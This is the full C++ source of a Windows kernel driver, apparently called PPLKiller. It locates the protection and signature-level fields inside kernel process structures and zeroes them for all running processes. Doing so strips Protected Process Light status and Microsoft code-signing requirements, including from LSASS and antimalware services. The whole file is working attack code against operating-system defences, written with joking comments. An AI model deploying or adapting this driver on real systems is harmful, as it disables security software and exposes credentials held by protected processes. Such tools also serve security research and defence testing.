#include "procinfo.h"
#include <stdio.h>
#include <stdarg.h>

// Exclude false positive matches in the KPROCESS/Pcb header
#ifdef _M_AMD64
#define PS_SEARCH_START				0x600
#else
#define PS_SEARCH_START				0x200
#endif

extern "C"
{
	_Function_class_(DRIVER_INITIALIZE)
	_IRQL_requires_(PASSIVE_LEVEL)
	DRIVER_INITIALIZE
	DriverEntry;

	_Function_class_(DRIVER_UNLOAD)
	_IRQL_requires_(PASSIVE_LEVEL)
	DRIVER_UNLOAD
	DriverUnload;

	VOID
	Log(
		_In_ PCCH Format,
		_In_ ...
		);

	NTSTATUS
	FindPsProtectionOffset(
		_Out_ PULONG PsProtectionOffset
		);

	NTSTATUS
	FindSignatureLevelOffsets(
		_Out_ PULONG SignatureLevelOffset,
		_Out_ PULONG SectionSignatureLevelOffset
		);

	NTSTATUS
	UnprotectProcesses(
		_In_opt_ ULONG PsProtectionOffset,
		_In_opt_ ULONG SignatureLevelOffset,
		_In_opt_ ULONG SectionSignatureLevelOffset,
		_Out_ PULONG NumProcessesUnprotected,
		_Out_ PULONG NumSignatureRequirementsRemoved
		);
}

#ifdef ALLOC_PRAGMA
#pragma alloc_text(PAGE, FindPsProtectionOffset)
#pragma alloc_text(PAGE, FindSignatureLevelOffsets)
#pragma alloc_text(PAGE, UnprotectProcesses)
#pragma alloc_text(PAGE, DriverUnload)
#pragma alloc_text(INIT, DriverEntry)
#endif

constexpr const CHAR* const SeSigningLevelNames[] =
{
	"SE_SIGNING_LEVEL_UNCHECKED",		// 0x0
	"SE_SIGNING_LEVEL_UNSIGNED",
	"SE_SIGNING_LEVEL_ENTERPRISE",
	"SE_SIGNING_LEVEL_CUSTOM_1",
	"SE_SIGNING_LEVEL_AUTHENTICODE",
	"SE_SIGNING_LEVEL_CUSTOM_2",
	"SE_SIGNING_LEVEL_STORE",
	"SE_SIGNING_LEVEL_ANTIMALWARE",
	"SE_SIGNING_LEVEL_MICROSOFT",
	"SE_SIGNING_LEVEL_CUSTOM_4",
	"SE_SIGNING_LEVEL_CUSTOM_5",
	"SE_SIGNING_LEVEL_DYNAMIC_CODEGEN",
	"SE_SIGNING_LEVEL_WINDOWS",
	"SE_SIGNING_LEVEL_CUSTOM_7",
	"SE_SIGNING_LEVEL_WINDOWS_TCB",
	"SE_SIGNING_LEVEL_CUSTOM_6",		// 0xf
};

constexpr const CHAR* const SeSigningTypeNames[] =
{
	"SeImageSignatureNone",				// 0x0
	"SeImageSignatureEmbedded",
	"SeImageSignatureCache",
	"SeImageSignatureCatalogCached",
	"SeImageSignatureCatalogNotCached",
	"SeImageSignatureCatalogHint",
	"SeImageSignaturePackageCatalog",	// 0x6

	// Make sure it isn't possible to overrun the array bounds using 3 index bits
	"<INVALID>"							// 0x7
};

VOID
Log(
	_In_ PCCH Format,
	_In_ ...
	)
{
	CHAR Message[512];
	va_list VaList;
	va_start(VaList, Format);
	CONST ULONG N = _vsnprintf_s(Message, sizeof(Message) - sizeof(CHAR), Format, VaList);
	Message[N] = '\0';
	vDbgPrintExWithPrefix("[PPLKILLER] ", DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, Message, VaList);
	va_end(VaList);
}

// This can be done faster and in fewer lines of code by ghetto-disassembling
// PsIsProtectedProcess, but this method should hopefully be more robust
NTSTATUS
FindPsProtectionOffset(
	_Out_ PULONG PsProtectionOffset
	)
{
	PAGED_CODE();

	*PsProtectionOffset = 0;

	// Since the EPROCESS struct is opaque and we don't know its size, allocate for 4K possible offsets
	const PULONG CandidateOffsets = static_cast<PULONG>(
		ExAllocatePoolWithTag(NonPagedPoolNx,
							PAGE_SIZE * sizeof(ULONG),
							'LPPK'));
	if (CandidateOffsets == nullptr)
		return STATUS_NO_MEMORY;
	RtlZeroMemory(CandidateOffsets, sizeof(ULONG) * PAGE_SIZE);
	
	// Query all running processes
	ULONG NumProtectedProcesses = 0, BestMatchCount = 0, Offset = 0;
	NTSTATUS Status;
	ULONG Size;
	PSYSTEM_PROCESS_INFORMATION SystemProcessInfo = nullptr, Entry;
	if ((Status = ZwQuerySystemInformation(SystemProcessInformation,
											SystemProcessInfo,
											0,
											&Size)) != STATUS_INFO_LENGTH_MISMATCH)
		goto finished;
	SystemProcessInfo = static_cast<PSYSTEM_PROCESS_INFORMATION>(
		ExAllocatePoolWithTag(NonPagedPoolNx,
								2 * Size,
								'LPPK'));
	if (SystemProcessInfo == nullptr)
	{
		Status = STATUS_NO_MEMORY;
		goto finished;
	}
	Status = ZwQuerySystemInformation(SystemProcessInformation,
										SystemProcessInfo,
										2 * Size,
										nullptr);
	if (!NT_SUCCESS(Status))
		goto finished;

	// Enumerate the process list
	Entry = SystemProcessInfo;
	while (true)
	{
		OBJECT_ATTRIBUTES ObjectAttributes = RTL_CONSTANT_OBJECT_ATTRIBUTES(static_cast<PUNICODE_STRING>(nullptr),
																			OBJ_KERNEL_HANDLE);
		CLIENT_ID ClientId = { Entry->UniqueProcessId, nullptr };
		HANDLE ProcessHandle;
		Status = ZwOpenProcess(&ProcessHandle,
								PROCESS_QUERY_LIMITED_INFORMATION,
								&ObjectAttributes,
								&ClientId);
		if (NT_SUCCESS(Status))
		{
			// Query the process's protection status
			PS_PROTECTION ProtectionInfo;
			Status = ZwQueryInformationProcess(ProcessHandle,
												ProcessProtectionInformation,
												&ProtectionInfo,
												sizeof(ProtectionInfo),
												nullptr);

			// If it's protected (light or otherwise), get the EPROCESS
			if (NT_SUCCESS(Status) && ProtectionInfo.Level > 0)
			{
				PEPROCESS Process;
				Status = ObReferenceObjectByHandle(ProcessHandle,
												PROCESS_QUERY_LIMITED_INFORMATION,
												*PsProcessType,
												KernelMode,
												reinterpret_cast<PVOID*>(&Process),
												nullptr);
				if (NT_SUCCESS(Status))
				{
					// Find offsets in the EPROCESS that are a match for the PS_PROTECTION we got
					CONST ULONG_PTR End = ALIGN_UP_BY(Process, PAGE_SIZE) - reinterpret_cast<ULONG_PTR>(Process);
					for (ULONG_PTR i = PS_SEARCH_START; i < End; ++i)
					{
						CONST PPS_PROTECTION Candidate = reinterpret_cast<PPS_PROTECTION>(reinterpret_cast<PUCHAR>(Process) + i);
						if (Candidate->Level == ProtectionInfo.Level)
							CandidateOffsets[i]++;
					}
					NumProtectedProcesses++;
					ObfDereferenceObject(Process);
				}
			}
			ZwClose(ProcessHandle);
		}

		if (Entry->NextEntryOffset == 0)
			break;
		
		Entry = reinterpret_cast<PSYSTEM_PROCESS_INFORMATION>(reinterpret_cast<ULONG_PTR>(Entry) +
																Entry->NextEntryOffset);
	}

	// Go over the possible offsets to find the one that is correct for all processes
	for (ULONG i = PS_SEARCH_START; i < PAGE_SIZE; ++i)
	{
		if (CandidateOffsets[i] > BestMatchCount)
		{
			if (BestMatchCount == NumProtectedProcesses)
			{
				Log("Found multiple offsets for PS_PROTECTION that match all processes! You should uninstall some rootkits.\n");
				Status = STATUS_NOT_FOUND;
				goto finished;
			}
			Offset = i;
			BestMatchCount = CandidateOffsets[i];
		}
	}

	if (BestMatchCount == 0 && NumProtectedProcesses > 0)
	{
		Log("Did not find any possible offsets for the PS_PROTECTION field.\n");
		Status = STATUS_NOT_FOUND;
		goto finished;
	}

	if (BestMatchCount != NumProtectedProcesses)
	{
		Log("Best found PS_PROTECTION offset match +0x%02X is only valid for %u of %u protected processes.\n",
			Offset, BestMatchCount, NumProtectedProcesses);
		Status = STATUS_NOT_FOUND;
		goto finished;
	}

	if (NumProtectedProcesses > 1) // Require at least System + 1 PPL to give a reliable result
		Log("Found PS_PROTECTION offset +0x%02X.\n", Offset);
	else
	{
		// This is not an error condition; it just means there are no processes to unprotect.
		// There may still be processes with signature requirements to remove. Set a non-error status to indicate this.
		Log("Did not find any non-system protected processes.\n");
		Status = STATUS_NO_MORE_ENTRIES;
		Offset = 0;
	}
		
	*PsProtectionOffset = Offset;

finished:
	if (SystemProcessInfo != nullptr)
		ExFreePoolWithTag(SystemProcessInfo, 'LPPK');
	ExFreePoolWithTag(CandidateOffsets, 'LPPK');
	return Status;
}

// This is only called on Windows >= 10.0.15063.0. The 'MS signature required' mitigation
// policy predates that, but the kernel mode check in MiValidateSectionCreate does not
NTSTATUS
FindSignatureLevelOffsets(
	_Out_ PULONG SignatureLevelOffset,
	_Out_ PULONG SectionSignatureLevelOffset
	)
{
	PAGED_CODE();

	*SignatureLevelOffset = 0;
	*SectionSignatureLevelOffset = 0;

	// Since the EPROCESS struct is opaque and we don't know its size, allocate for 4K possible offsets
	const PULONG CandidateSignatureLevelOffsets = static_cast<PULONG>(
		ExAllocatePoolWithTag(NonPagedPoolNx,
							PAGE_SIZE * sizeof(ULONG),
							'LPPK'));
	if (CandidateSignatureLevelOffsets == nullptr)
		return STATUS_NO_MEMORY;
	const PULONG CandidateSectionSignatureLevelOffsets = static_cast<PULONG>(
		ExAllocatePoolWithTag(NonPagedPoolNx,
							PAGE_SIZE * sizeof(ULONG),
							'LPPK'));
	if (CandidateSectionSignatureLevelOffsets == nullptr)
	{
		ExFreePoolWithTag(CandidateSignatureLevelOffsets, 'LPPK');
		return STATUS_NO_MEMORY;
	}
	RtlZeroMemory(CandidateSignatureLevelOffsets, sizeof(ULONG) * PAGE_SIZE);
	RtlZeroMemory(CandidateSectionSignatureLevelOffsets, sizeof(ULONG) * PAGE_SIZE);
	
	// Query all running processes
	ULONG NumSignatureRequiredProcesses = 0, BestMatchCount = 0;
	ULONG SignatureOffset = 0, SectionSignatureOffset = 0;
	NTSTATUS Status;
	ULONG Size;
	PSYSTEM_PROCESS_INFORMATION SystemProcessInfo = nullptr, Entry;
	if ((Status = ZwQuerySystemInformation(SystemProcessInformation,
											SystemProcessInfo,
											0,
											&Size)) != STATUS_INFO_LENGTH_MISMATCH)
		goto finished;
	SystemProcessInfo = static_cast<PSYSTEM_PROCESS_INFORMATION>(
		ExAllocatePoolWithTag(NonPagedPoolNx,
								2 * Size,
								'LPPK'));
	if (SystemProcessInfo == nullptr)
	{
		Status = STATUS_NO_MEMORY;
		goto finished;
	}
	Status = ZwQuerySystemInformation(SystemProcessInformation,
										SystemProcessInfo,
										2 * Size,
										nullptr);
	if (!NT_SUCCESS(Status))
		goto finished;

	// Enumerate the process list
	Entry = SystemProcessInfo;
	while (true)
	{
		OBJECT_ATTRIBUTES ObjectAttributes = RTL_CONSTANT_OBJECT_ATTRIBUTES(static_cast<PUNICODE_STRING>(nullptr),
																			OBJ_KERNEL_HANDLE);
		CLIENT_ID ClientId = { Entry->UniqueProcessId, nullptr };
		HANDLE ProcessHandle;
		Status = ZwOpenProcess(&ProcessHandle,
								PROCESS_QUERY_LIMITED_INFORMATION,
								&ObjectAttributes,
								&ClientId);
		if (NT_SUCCESS(Status))
		{
			// Query the process's signature policy status
			PROCESS_MITIGATION_POLICY_INFORMATION PolicyInfo;
			PolicyInfo.Policy = ProcessSignaturePolicy;
			Status = ZwQueryInformationProcess(ProcessHandle,
												ProcessMitigationPolicy,
												&PolicyInfo,
												sizeof(PolicyInfo),
												nullptr);

			// If it has an MS signature policy requirement, get the EPROCESS
			if (NT_SUCCESS(Status) && PolicyInfo.u.SignaturePolicy.MicrosoftSignedOnly != 0)
			{
				PEPROCESS Process;
				Status = ObReferenceObjectByHandle(ProcessHandle,
												PROCESS_QUERY_LIMITED_INFORMATION,
												*PsProcessType,
												KernelMode,
												reinterpret_cast<PVOID*>(&Process),
												nullptr);
				if (NT_SUCCESS(Status))
				{
					// Find plausible offsets in the EPROCESS
					const ULONG_PTR End = ALIGN_UP_BY(Process, PAGE_SIZE) - reinterpret_cast<ULONG_PTR>(Process) - sizeof(UCHAR);
					for (ULONG_PTR i = PS_SEARCH_START; i < End; ++i)
					{
						// Take the low nibble of both bytes, which contains the SE_SIGNING_LEVEL_*
						const UCHAR CandidateSignatureLevel = *(reinterpret_cast<PUCHAR>(Process) + i) & 0xF;
						const ULONG CandidateSectionSignatureLevel = *(reinterpret_cast<PUCHAR>(Process) + i + sizeof(UCHAR)) & 0xF;

						if ((CandidateSignatureLevel == SE_SIGNING_LEVEL_MICROSOFT ||
							CandidateSignatureLevel == SE_SIGNING_LEVEL_WINDOWS ||
							CandidateSignatureLevel == SE_SIGNING_LEVEL_ANTIMALWARE ||
							CandidateSignatureLevel == SE_SIGNING_LEVEL_WINDOWS_TCB)
							&&
							(CandidateSectionSignatureLevel == SE_SIGNING_LEVEL_MICROSOFT ||
							CandidateSectionSignatureLevel == SE_SIGNING_LEVEL_WINDOWS))
						{
							CandidateSignatureLevelOffsets[i]++;
							i += sizeof(UCHAR);
							CandidateSectionSignatureLevelOffsets[i]++;
						}
					}
					NumSignatureRequiredProcesses++;
					ObfDereferenceObject(Process);
				}
			}
			ZwClose(ProcessHandle);
		}

		if (Entry->NextEntryOffset == 0)
			break;
		
		Entry = reinterpret_cast<PSYSTEM_PROCESS_INFORMATION>(reinterpret_cast<ULONG_PTR>(Entry) +
																Entry->NextEntryOffset);
	}

	// Go over the possible offsets to find the combination that is correct for all processes
	for (ULONG i = PS_SEARCH_START; i < PAGE_SIZE; ++i)
	{
		if (CandidateSignatureLevelOffsets[i] > BestMatchCount)
		{
			if (BestMatchCount == NumSignatureRequiredProcesses)
			{
				Log("Found multiple offsets for SignatureLevel that match all processes! This is probably a bug - please report.\n");
				Status = STATUS_NOT_FOUND;
				goto finished;
			}
			SignatureOffset = i;
			SectionSignatureOffset = i + sizeof(UCHAR);
			BestMatchCount = CandidateSignatureLevelOffsets[i];
		}
	}

	if (BestMatchCount == 0 && NumSignatureRequiredProcesses > 0)
	{
		Log("Did not find any possible offsets for the SignatureLevel field.\n");
		Status = STATUS_NOT_FOUND;
		goto finished;
	}

	if (BestMatchCount != NumSignatureRequiredProcesses)
	{
		Log("Best found SignatureLevel offset match +0x%02X is only valid for %u of %u processes.\n",
			SignatureOffset, BestMatchCount, NumSignatureRequiredProcesses);
		Status = STATUS_NOT_FOUND;
		goto finished;
	}

	if (NumSignatureRequiredProcesses > 1) // Require at least System + 1 other MS signing policy process to give a reliable result
		Log("Found SignatureLevel offset +0x%02X and SectionSignatureLevel offset +0x%02X.\n\n",
			SignatureOffset, SectionSignatureOffset);
	else
	{
		// This is not an error condition; it just means there are no processes with MS code signing requirements.
		// There may still be PPLs to kill. Set a non-error status to indicate this.
		Log("Did not find any non-system processes with signature requirements.\n");
		Status = STATUS_NO_MORE_ENTRIES;
		SignatureOffset = 0;
		SectionSignatureOffset = 0;
	}
	*SignatureLevelOffset = SignatureOffset;
	*SectionSignatureLevelOffset = SectionSignatureOffset;

finished:
	if (SystemProcessInfo != nullptr)
		ExFreePoolWithTag(SystemProcessInfo, 'LPPK');
	ExFreePoolWithTag(CandidateSectionSignatureLevelOffsets, 'LPPK');
	ExFreePoolWithTag(CandidateSignatureLevelOffsets, 'LPPK');
	return Status;
}

NTSTATUS
UnprotectProcesses(
	_In_opt_ ULONG PsProtectionOffset,
	_In_opt_ ULONG SignatureLevelOffset,
	_In_opt_ ULONG SectionSignatureLevelOffset,
	_Out_ PULONG NumProcessesUnprotected,
	_Out_ PULONG NumSignatureRequirementsRemoved
	)
{
	PAGED_CODE();

	*NumProcessesUnprotected = 0;
	*NumSignatureRequirementsRemoved = 0;

	// Query all running processes
	NTSTATUS Status;
	ULONG Size;
	PSYSTEM_PROCESS_INFORMATION SystemProcessInfo = nullptr, Entry;
	if ((Status = ZwQuerySystemInformation(SystemProcessInformation,
											SystemProcessInfo,
											0,
											&Size)) != STATUS_INFO_LENGTH_MISMATCH)
		return Status;
	SystemProcessInfo = static_cast<PSYSTEM_PROCESS_INFORMATION>(
		ExAllocatePoolWithTag(NonPagedPoolNx,
							2 * Size,
							'LPPK'));
	if (SystemProcessInfo == nullptr)
	{
		Status = STATUS_NO_MEMORY;
		goto finished;
	}
	Status = ZwQuerySystemInformation(SystemProcessInformation,
										SystemProcessInfo,
										2 * Size,
										nullptr);
	if (!NT_SUCCESS(Status))
		goto finished;

	// Enumerate the process list
	Entry = SystemProcessInfo;
	while (true)
	{
		PEPROCESS Process;
		Status = PsLookupProcessByProcessId(Entry->UniqueProcessId,
											&Process);
		if (NT_SUCCESS(Status))
		{
			const ULONG Pid = HandleToULong(Entry->UniqueProcessId);

			if (PsProtectionOffset != 0) // Do we have any PPLs to unprotect?
			{
				const PPS_PROTECTION PsProtection = reinterpret_cast<PPS_PROTECTION>(
				reinterpret_cast<PUCHAR>(Process) + PsProtectionOffset);

				// Skip non-light protected processes (i.e. System).
				// You could also discriminate by signer, e.g. to leave LSASS or antimalware protection enabled
				if (PsProtection->Level != 0 &&
					PsProtection->s.Type == PsProtectedTypeProtectedLight)
				{
					Log("PID %u (%wZ) at 0x%p is a PPL: { type: %u, audit: %u, signer: %u }.\n", Pid, &Entry->ImageName,
						Process, PsProtection->s.Type, PsProtection->s.Audit, PsProtection->s.Signer);
				
					// Goodnight sweet prince
					PsProtection->Level = 0;
					(*NumProcessesUnprotected)++;
					Log("Protection removed.\n\n");
				}
			}

			if (Pid != 0 && !PsIsSystemProcess(Process) &&						// Not a system process?
				SignatureLevelOffset != 0 && SectionSignatureLevelOffset != 0)	// >= Windows 10 RS2, and offsets known?
			{
				const PUCHAR SignatureLevelByte = reinterpret_cast<PUCHAR>(Process) + SignatureLevelOffset;
				const PUCHAR SectionSignatureLevelByte = reinterpret_cast<PUCHAR>(Process) + SectionSignatureLevelOffset;
				const UCHAR SignatureLevel = *SignatureLevelByte & 0xF;
				const UCHAR ImageSignatureType = (*SignatureLevelByte >> 4) & 0x7;
				const UCHAR SectionSignatureLevel = *SectionSignatureLevelByte & 0xF;

				if ((SignatureLevel == SE_SIGNING_LEVEL_MICROSOFT ||
					SignatureLevel == SE_SIGNING_LEVEL_WINDOWS ||
					SignatureLevel == SE_SIGNING_LEVEL_ANTIMALWARE ||
					SignatureLevel == SE_SIGNING_LEVEL_WINDOWS_TCB)
					&&
					(SectionSignatureLevel == SE_SIGNING_LEVEL_MICROSOFT ||
					SectionSignatureLevel == SE_SIGNING_LEVEL_WINDOWS))
				{
					Log("PID %u (%wZ) at 0x%p has a Microsoft code signing requirement:\n", Pid, &Entry->ImageName, Process);

					// NB: the SE_IMAGE_SIGNATURE_TYPE can be 'none' while still having an MS code signing policy, so this isn't a reliable indicator.
					// Normally though it will either be SeImageSignatureEmbedded (system process) or SeImageSignatureCatalogCached (other processes).
					Log("Image signature level:\t0x%02X [%s], type: 0x%02X [%s]\n",
						SignatureLevel, SeSigningLevelNames[SignatureLevel],
						ImageSignatureType, SeSigningTypeNames[ImageSignatureType]);
					Log("Section signature level:\t0x%02X [%s]\n",
						SectionSignatureLevel, SeSigningLevelNames[SectionSignatureLevel]);

					// Hasta la vista baby
					*SignatureLevelByte = 0;
					*SectionSignatureLevelByte = 0;
					(*NumSignatureRequirementsRemoved)++;
					Log("Requirements removed.\n\n");
				}
			}

			ObfDereferenceObject(Process);
		}

		if (Entry->NextEntryOffset == 0)
			break;

		Entry = reinterpret_cast<PSYSTEM_PROCESS_INFORMATION>(reinterpret_cast<ULONG_PTR>(Entry) +
																Entry->NextEntryOffset);
	}

finished:
	if (SystemProcessInfo != nullptr)
		ExFreePoolWithTag(SystemProcessInfo, 'LPPK');
	return Status;
}

_Use_decl_annotations_
NTSTATUS
DriverEntry(
	_In_ PDRIVER_OBJECT DriverObject,
	_In_ PUNICODE_STRING RegistryPath
	)
{
	PAGED_CODE();

	UNREFERENCED_PARAMETER(RegistryPath);
	
	OSVERSIONINFOEXW VersionInfo = { sizeof(OSVERSIONINFOEXW) };
	NTSTATUS Status = RtlGetVersion(reinterpret_cast<PRTL_OSVERSIONINFOW>(&VersionInfo));
	if (!NT_SUCCESS(Status))
		return Status;

	// Only Windows 8.1 and later are afflicted with PPL.
	if (VersionInfo.dwMajorVersion < 6 ||
		(VersionInfo.dwMajorVersion == 6 && VersionInfo.dwMinorVersion < 3))
	{
		Log("Unsupported OS version. Be glad!\n");
		return STATUS_NOT_SUPPORTED;
	}

	// Find the offset of the PS_PROTECTION field for the running kernel
	ULONG PsProtectionOffset;
	Status = FindPsProtectionOffset(&PsProtectionOffset);
	if (!NT_SUCCESS(Status) && Status != STATUS_NO_MORE_ENTRIES)
	{
		Log("Failed to find the PS_PROTECTION offset for Windows %u.%u.%u.\n",
			VersionInfo.dwMajorVersion, VersionInfo.dwMinorVersion, VersionInfo.dwBuildNumber);
		return Status;
	}

	// Only Windows 10.0.15063.0 and later are afflicted with kernel-enforced MS code signing requirements.
	ULONG SignatureLevelOffset = 0, SectionSignatureLevelOffset = 0;
	if (VersionInfo.dwBuildNumber >= 15063)
	{
		// Find the offsets of the [Section]SignatureLevel fields
		Status = FindSignatureLevelOffsets(&SignatureLevelOffset, &SectionSignatureLevelOffset);
		if (!NT_SUCCESS(Status) && Status != STATUS_NO_MORE_ENTRIES)
		{
			Log("Failed to find the SignatureLevel and SectionSignatureLevel offsets for Windows %u.%u.%u.\n",
				VersionInfo.dwMajorVersion, VersionInfo.dwMinorVersion, VersionInfo.dwBuildNumber);
			return Status;
		}
	}

	// Remove process protection and signing requirements from all running non-system processes.
	ULONG NumUnprotected, NumSignatureRequirementsRemoved;
	Status = UnprotectProcesses(PsProtectionOffset,
								SignatureLevelOffset,
								SectionSignatureLevelOffset,
								&NumUnprotected,
								&NumSignatureRequirementsRemoved);
	if (!NT_SUCCESS(Status))
	{
		Log("UnprotectProcesses: error %08X\n", Status);
		return Status;
	}

	if (NumUnprotected > 0 || NumSignatureRequirementsRemoved > 0)
	{
		Log("Success.\n");
		Log("Removed PPL protection from %u processes.\n", NumUnprotected);
		if (VersionInfo.dwBuildNumber >= 15063)
			Log("Removed code signing requirements from %u processes.\n", NumSignatureRequirementsRemoved);
	}
	else
	{
		Log("No action was taken.\n");
	}

	// Set the driver unload function.
	// Note: you can freely return an error status at this point instead so you don't have to manually 'sc stop pplkiller'.
	// The only reason the driver returns success is to prevent inane bug reports about the driver not working when it is
	DriverObject->DriverUnload = DriverUnload;

	Log("Driver loaded successfully. You can unload it again now since it doesn't do anything.\n");

	return STATUS_SUCCESS;
}

_Use_decl_annotations_
VOID
DriverUnload(
	_In_ PDRIVER_OBJECT DriverObject
	)
{
	PAGED_CODE();
	UNREFERENCED_PARAMETER(DriverObject);
	Log("Driver unloaded.\n");
}
